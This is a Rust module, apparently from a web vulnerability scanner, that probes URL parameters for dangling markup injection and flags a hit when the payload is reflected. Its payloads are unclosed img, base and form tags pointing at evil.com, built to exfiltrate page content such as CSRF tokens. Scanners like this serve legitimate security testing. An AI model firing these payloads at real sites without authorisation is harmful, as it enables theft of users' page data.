use colored::*;
use crate::core::client::HttpClient;
use crate::core::analyzer::Analyzer;

/// Dangling Markup Injection detection
pub async fn detect(target: &str) -> anyhow::Result<()> {
    println!("{} Testing: Dangling Markup", "[*]".yellow());

    let params = Analyzer::extract_params(target);
    if params.is_empty() { return Ok(()); }

    let client = HttpClient::new()?;
    let canary = format!("lzrdm{}", rand::random::<u16>());

    // Dangling markup payloads — unclosed tags to exfiltrate page content
    let payloads = vec![
        format!("<img src='https://evil.com/steal?c={}", canary),
        format!("<base href='https://evil.com/{}", canary),
        format!("<form action='https://evil.com/{}", canary),
        format!("<input type=hidden name=csrf value='"),
    ];

    for (param_name, _) in &params {
        for payload in &payloads {
            let url = Analyzer::inject_param(target, param_name, payload)?;
            if let Ok(result) = Analyzer::send_and_analyze(&client, &url, "").await {
                // Check if unclosed tag is reflected (enables content exfil)
                if result.response_body.contains(&format!("src='https://evil.com/steal?c={}", canary))
                    || result.response_body.contains("href='https://evil.com/")
                    || result.response_body.contains("action='https://evil.com/")
                {
                    println!(
                        "{} CONFIRMED: Dangling Markup in param '{}'",
                        "[!]".red().bold(), param_name
                    );
                    println!("    Impact: Page content exfiltration via unclosed tag");
                    return Ok(());
                }
            }
        }
    }

    Ok(())
}
